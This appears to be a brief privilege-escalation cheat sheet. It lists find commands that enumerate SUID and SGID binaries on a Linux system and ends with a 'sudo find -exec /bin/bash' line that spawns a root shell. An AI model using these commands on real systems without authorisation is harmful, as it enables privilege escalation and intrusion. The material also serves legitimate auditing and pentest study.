               !/bin/sh
         Find files based on permissions:
          - find /* -type f -perm /2000 -ls 2>/dev/null - SGID
          - find /* -type f -perm /4000 -ls 2>/dev/null - SUID
          - find /* -type f -perm /6000 -ls 2>/dev/null - SGID + SUID
          - sudo find . -exec /bin/bash \; -quit  
           
